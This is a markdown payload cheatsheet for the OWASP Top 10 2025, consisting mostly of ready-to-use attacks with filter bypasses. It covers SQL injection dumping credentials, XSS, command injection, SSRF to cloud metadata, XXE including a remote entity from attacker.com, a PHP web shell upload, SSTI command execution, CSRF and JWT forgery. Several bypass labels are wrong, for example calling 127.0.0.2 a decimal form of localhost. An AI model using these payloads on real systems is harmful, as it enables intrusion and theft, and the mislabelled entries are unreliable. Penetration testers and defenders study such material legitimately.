---
name: "OWASP Top 10 Payloads Cheatsheet"
description: "Comprehensive payload reference for OWASP Top 10 2025 categories — vulnerable parameters, HTTP request examples, and bypass techniques per vulnerability type."
tags: [payloads, owasp, sql-injection, xss, command-injection, ssrf, ldap, xxe, deserialization, file-upload, lfi, ssti, csrf, sso]
---

# OWASP Top 10 2025 — Payloads Cheatsheet

## 1. SQL Injection (SQLi)

**Vulnerable Parameters:** `id`, `search`, `category`, `sort`, `filter`, `user`, `uuid`, `X-Forwarded-For`, `User-Agent`

**HTTP Example:**
```http
POST /api/products HTTP/1.1
Host: target.local
Content-Type: application/json

{
  "category": "electronics' UNION SELECT 1,username,password,4 FROM users--"
}
```

**Bypass Techniques:**

- **Space Filter Bypass:** inline comments (`/**/`), tab (`%09`)
  ```sql
  '/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users--
  ```

- **String Detection Bypass (WAF):** `CHAR()`, hex functions
  ```sql
  ' UNION SELECT CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110) --
  ```

- **Quote Filter Bypass (Blind/Time-based):** hex table names without quotes
  ```sql
  ' OR (SELECT 1 FROM(SELECT(SLEEP(5)))a) AND '1'='1
  ```

---

## 2. Cross-Site Scripting (XSS)

**Vulnerable Parameters:** `q`, `query`, `name`, `redirect_url`, `callback`, `error`, file metadata, any reflected/stored text input

**HTTP Example (Reflected XSS):**
```http
GET /welcome.php?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: target.local
```

**Bypass Techniques:**

- **`<script>` Tag Bypass:** alternative HTML elements
  ```html
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  ```

- **Keyword Filter Bypass (`alert`, `eval`):** string concatenation
  ```html
  <svg onload=javascript:window['al'+'ert'](document.domain)>
  <img src=x onerror="confirm(1)">
  ```

- **WAF Polymorphism Bypass:** null bytes, non-standard chars
  ```html
  <a href="javascript&colon;alert(1)">Click</a>
  <<script>alert(1)//<</script>
  ```

---

## 3. Command Injection

**Vulnerable Parameters:** `ip`, `host`, `cmd`, `filename`, `dir`, `path`, image/video processing functions (ffmpeg, ImageMagick)

**HTTP Example:**
```http
POST /admin/ping HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

target=127.0.0.1%3B+cat+/etc/passwd
```

**Bypass Techniques:**

- **Separator Filter Bypass (`;`, `&`, `|`):** URL-encoded newline (`%0a`), command substitution
  ```bash
  127.0.0.1%0acat /etc/passwd
  127.0.0.1 $(whoami)
  ```

- **Space Filter Bypass:** environment variables (`${IFS}`), input redirection (`<`)
  ```bash
  cat${IFS}/etc/passwd
  cat< /etc/passwd
  ```

- **Blacklist Filter Bypass:** quotes mid-word, string concatenation
  ```bash
  w'h'o'a'm'i
  a=c; b=at; $a$b /etc/passwd
  ```

---

## 4. Server-Side Request Forgery (SSRF) — A01:2025

**Vulnerable Parameters:** `url`, `uri`, `path`, `api`, `image_url`, `webhook`, `feed`, `proxy`

**HTTP Example:**
```http
POST /v1/avatar/fetch HTTP/1.1
Host: target.local
Content-Type: application/json

{
  "url": "http://127.0.0.1:6379"
}
```

**Bypass Techniques:**

- **`localhost` / `127.0.0.1` Filter Bypass:** decimal, octal, DNS wildcards
  ```
  http://127.0.0.2            (Decimal variant)
  http://0177.0.0.1           (Octal representation)
  http://nip.io               (DNS wildcard — resolves to 127.0.0.1)
  ```

- **Cloud Metadata Filter Bypass:** AWS/GCP metadata endpoints
  ```
  http://169.254.169.254      (AWS metadata)
  http://metadata.google.internal  (GCP metadata)
  ```

- **URL Schema Bypass:** non-HTTP protocols
  ```
  gopher://127.0.0.1:6379/_SET%20test%20payload
  dict://127.0.0.1:11211/stat
  ```

---

## 5. LDAP Injection

**Vulnerable Parameters:** `user`, `username`, `group`, `search`, `cn`, `employeeId`

**HTTP Example:**
```http
POST /login HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=admin*)(%26&password=any
```

**Bypass Techniques:**

- **Authentication Bypass:** wildcard (`*`) to truncate LDAP query
  ```
  *)(uid=*))(|(uid=*
  *
  ```

- **Attribute Extraction (OR/AND Logic Bypass):**
  ```
  admin)(|(password=*))
  *)(objectClass=*
  ```

---

## 6. XML External Entity (XXE)

**Vulnerable Parameters:** Any endpoint accepting `application/xml`, file uploads in XML-based formats (.docx, .svg, .xlsx)

**HTTP Example:**
```http
POST /api/xml-endpoint HTTP/1.1
Host: target.local
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><username>&xxe;</username><password>pass</password></user>
```

**Bypass Techniques:**

- **SYSTEM Keyword Bypass:** parameter entities, wrapper protocols
  ```xml
  <!DOCTYPE test [ <!ENTITY % remote SYSTEM "http://attacker.com">%remote; ]>
  ```

- **Binary Character Restriction Bypass (PHP wrapper):** base64 encode output
  ```xml
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ```

---

## 7. Insecure Deserialization — A08:2025

**Vulnerable Parameters:** `session`, `cookie`, `state`, `token`, base64/hex serialized objects in POST parameters

**HTTP Example (PHP):**
```http
GET /dashboard HTTP/1.1
Host: target.local
Cookie: session=Tz00OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NToiaXNBZG0iO2I6MTt9
```

**Bypass Techniques:**

- **PHP Object Injection:** modify internal class properties to trigger magic methods (`__destruct`, `__wakeup`)
  ```php
  O:8:"GuzzleHttp\Cookie\CookieJar":1:{s:7:"cookies";a:1:{i:0;O:11:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:1:{s:7:"Expires";"ls -la";}}}}
  ```

- **Java Deserialization (Gadget Chains):** use ysoserial for bypass
  ```bash
  java -jar ysoserial.jar CommonsCollections7 'open -a Calculator' | base64
  ```

---

## 8. Unrestricted File Upload

**Vulnerable Parameters:** Multipart file upload forms (`profile_pic`, `attachment`, `document`)

**HTTP Example:**
```http
POST /upload.php HTTP/1.1
Host: target.local
Content-Type: multipart/form-data; boundary=---------------------------12345

-----------------------------12345
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
-----------------------------12345--
```

**Bypass Techniques:**

- **Extension Blacklist Bypass:** alternative executable extensions
  ```
  shell.phtml, shell.php5, shell.phar     (PHP)
  shell.jspx, shell.jspf                   (JSP)
  shell.asa, shell.cer, shell.asax         (ASP)
  ```

- **MIME-Type Validation Bypass:** spoof Content-Type header
  ```http
  Content-Type: image/jpeg
  ```

- **Magic Byte Validation Bypass:** prepend image signature
  ```
  GIF89a;
  <?php system($_GET['cmd']); ?>
  ```

- **Filename Sanitization Bypass:**
  ```
  shell.php.jpg              (Double extension)
  shell.php.png.jpg.php      (Apache fallback parsing)
  shell.php%00.png            (Null byte injection)
  ```

---

## 9. Path Traversal / Local File Inclusion (LFI)

**Vulnerable Parameters:** `file`, `page`, `doc`, `view`, `template`, `lang`, `image`

**HTTP Example:**
```http
GET /static/view?file=../../../../etc/passwd HTTP/1.1
Host: target.local
```

**Bypass Techniques:**

- **Recursive Filter Bypass (`../` stripped):**
  ```
  ....//....//....//etc/passwd
  ..././..././..././etc/passwd
  ```

- **URL Encoding Bypass:**
  ```
  %2e%2e%2f%2e%2e%2fetc/passwd           (Single URL encoded)
  %252e%252e%252f%252e%252e%252fetc/passwd (Double URL encoded)
  ```

- **Extension Validation Bypass (e.g. must end in `.png`):**
  ```
  ../../../../etc/passwd%00.png
  ../../../../etc/passwd?.png
  ../../../../etc/passwd#.png
  ```

---

## 10. Server-Side Template Injection (SSTI)

**Vulnerable Parameters:** `template`, `message`, `name`, `email`, any parameter rendered server-side (Jinja2, Twig, Freemarker, MVEL)

**HTTP Example:**
```http
POST /render HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

text=%7B%7B7*7%7D%7D
```

**Bypass Techniques:**

- **Template Engine Detection Bypass — Twig:**
  ```
  {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
  ```

- **Jinja2 Bypass (No Quotes):** Python built-in object manipulation
  ```
  {{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
  ```

- **Quote Filter Bypass:** pass payload via request args
  ```
  {{request.application.__self__._lib.utils.import_module(request.args.mod).popen(request.args.cmd).read()}}&mod=os&cmd=id
  ```

---

## 11. Cross-Site Request Forgery (CSRF)

**Vulnerable Parameters:** State-changing POST/PUT requests without unique anti-CSRF token

**HTTP Example (Attacker's malicious page):**
```html
<form action="http://target.local/change-email" method="POST" id="csrfForm">
  <input type="hidden" name="email" value="attacker@evil.local" />
</form>
<script>
  document.getElementById('csrfForm').submit();
</script>
```

**Bypass Techniques:**

- **Content-Type Check Bypass (WAF/App):** change to alternative content type
  ```http
  Content-Type: text/plain
  ```

- **Token Validation Bypass:** remove token parameter entirely, or reuse attacker's own valid token

---

## 12. SSO Bypass (Single Sign-On) — A07:2025

**Vulnerable Parameters:** `SAMLResponse`, `Assertion`, JWT `id_token`, OAuth2 `state`, `redirect_uri`

**HTTP Example (JWT Manipulation):**
```http
POST /login/callback HTTP/1.1
Host: target.local
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Bypass Techniques:**

- **JWT None Algorithm Attack:** change header to `{"alg":"none"}`, remove signature
- **SAML Comment Injection:** inject XML comments in NameID to bypass account mapping
  ```xml
  <saml:NameID>admin<!-- comment -->@target.local</saml:NameID>
  ```
- **OAuth Redirect URI Bypass:** use open redirect or relative path manipulation to steal auth code
  ```
  https://target.local/auth/callback/../../attacker.com/callback
  ```

---

## References

- [OWASP Top 10:2025 Official](https://owasp.org/Top10/2025/)
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
